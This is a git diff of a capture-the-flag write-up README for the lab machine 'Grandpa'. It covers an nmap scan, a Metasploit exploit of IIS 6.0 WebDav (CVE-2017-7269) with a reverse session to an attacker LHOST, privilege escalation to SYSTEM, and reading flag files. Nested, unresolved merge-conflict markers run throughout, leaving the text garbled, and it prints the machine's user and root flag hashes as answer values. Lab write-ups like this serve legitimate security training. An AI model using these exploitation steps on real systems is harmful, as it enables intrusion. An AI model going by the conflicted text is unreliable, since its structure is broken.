@@ -15,9 +15,13 @@
 nmap -sV -sC -oA nmap/Grandpa 10.129.95.233
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![nmap](img/nmap.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![nmap](img/nmap.png)
+>>>>>>> bbca5bf (Update README.md)
 
 **Results:**
 ```
@@ -42,11 +46,16 @@ PORT   STATE SERVICE VERSION
 ### 🔓 Exploit IIS 6.0 WebDav (CVE-2017-7269)
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
 ![exploitdb](img/exploitdb.png)
 =======
 Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
+![exploitdb](img/exploitdb.png)
+>>>>>>> bbca5bf (Update README.md)
 
 ```bash
 msfconsole
@@ -55,6 +64,7 @@ set RHOSTS 10.129.95.233
 set LHOST 10.10.14.156
 run
 ```
+<<<<<<< HEAD
 <<<<<<< HEAD
 ![meterpreter](img/meterpreter.png)
 
@@ -67,6 +77,13 @@ run
 
 ---
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![meterpreter](img/meterpreter.png)
+
+> Meterpreter session opened.
+
+![lowprivi](img/lowprivi.png)
+>>>>>>> bbca5bf (Update README.md)
 
 ### 📍 Migrate Session (Stabilize)
 
@@ -76,9 +93,13 @@ migrate 1896  # wmiprvse.exe
 getuid
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![migrate](img/migrate.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![migrate](img/migrate.png)
+>>>>>>> bbca5bf (Update README.md)
 
 **Result**:
 ```
@@ -97,9 +118,13 @@ set SESSION 1
 run
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![recon](img/recon.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![recon](img/recon.png)
+>>>>>>> bbca5bf (Update README.md)
 
 **Vulnerable Suggestions:**
 - ms14_058_track_popup_menu
@@ -118,9 +143,13 @@ set LHOST 10.10.14.156
 run
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![root](img/root.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![root](img/root.png)
+>>>>>>> bbca5bf (Update README.md)
 
 ```bash
 getuid
@@ -139,6 +168,7 @@ Server username: NT AUTHORITY\SYSTEM
 cat C:\Users\[USERNAME]\Desktop\user.txt
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![userflag](img/userflag.png)
 =======
 
@@ -147,6 +177,9 @@ cat C:\Users\[USERNAME]\Desktop\user.txt
 bdff5ec67c3cff017f2bedc146a5d869
 ```
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![userflag](img/userflag.png)
+>>>>>>> bbca5bf (Update README.md)
 
 ---
 
@@ -156,6 +189,7 @@ bdff5ec67c3cff017f2bedc146a5d869
 cat C:\Users\Administrator\Desktop\root.txt
 ```
 <<<<<<< HEAD
+<<<<<<< HEAD
 ![rootflag](img/rootflag.png)
 =======
 
@@ -164,5 +198,8 @@ cat C:\Users\Administrator\Desktop\root.txt
 9359e905a2c35f861f6a57cecf28bb7b
 ```
 >>>>>>> 9f1f476 (Add files via upload)
+=======
+![rootflag](img/rootflag.png)
+>>>>>>> bbca5bf (Update README.md)
 
 ---
